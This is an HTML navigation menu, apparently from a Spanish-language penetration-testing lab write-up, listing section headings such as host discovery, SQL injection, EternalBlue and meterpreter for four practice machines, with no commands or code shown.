class="nav-text">MS17-010 | Eternal Blue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MS08-067"><span class="nav-text">MS08-067</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cve-2009-3103"><span class="nav-text">cve 2009-3103</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enlaces-de-interes"><span class="nav-text">Enlaces de interés</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-laboratorio"><span class="nav-text">Creación del laboratorio</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Recursos-necesarios"><span class="nav-text">Recursos necesarios</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-de-los-adaptadores-de-red"><span class="nav-text">Configuración de los adaptadores de red</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Configuracion-extra-maquinas"><span class="nav-text">Configuración extra máquinas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maquina-Symfonos-1"><span class="nav-text">Máquina Symfonos 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple"><span class="nav-text">Simple</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empezamos-el-laboratorio"><span class="nav-text">Empezamos el laboratorio</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Creacion-del-entorno-de-trabajo"><span class="nav-text">Creación del entorno de trabajo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Descubrimiento-de-hosts"><span class="nav-text">Descubrimiento de hosts</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneamos-puertos"><span class="nav-text">Escaneamos puertos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escaneo-de-servicios-y-sus-versiones"><span class="nav-text">Escaneo de servicios y sus versiones</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Symfonos"><span class="nav-text">🎯 Symfonos</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ssh"><span class="nav-text">Ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-Samba"><span class="nav-text">SMB&#x2F;Samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wordpress-en-h3l105"><span class="nav-text">Wordpress en h3l105</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Uso-de-WPScan"><span class="nav-text">Uso de WPScan</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh2john"><span class="nav-text">ssh2john</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Doc"><span class="nav-text">🎯 Doc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-1"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-1"><span class="nav-text">Web</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-1"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi"><span class="nav-text">SQLi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload"><span class="nav-text">File Upload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalada-de-privilegios-1"><span class="nav-text">Escalada de privilegios</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Experience"><span class="nav-text">🎯 Experience</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-2"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-vuln-scripts-nmap"><span class="nav-text">smb-vuln scripts nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-2"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-text">Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS17-010-Eternal-Blue"><span class="nav-text">MS17-010 | Eternal Blue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MS08-067"><span class="nav-text">MS08-067</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cve-2009-3103"><span class="nav-text">cve 2009-3103</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%AF-Simple"><span class="nav-text">🎯 Simple</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-3"><span class="nav-text">Enumeración</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-2"><span class="nav-text">Web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB"><span class="nav-text">SMB</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-3"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Upgradear-a-meterpreter"><span class="nav-text">Upgradear a meterpreter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Creando-ejecutable-para-crear-sesion-meterpreter"><span class="nav-text">Creando ejecutable para crear sesión meterpreter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enlaces-de-interes"><span class="nav-text">Enlaces de interés</span></a></li></ol>
 
 	</div>
 </div>
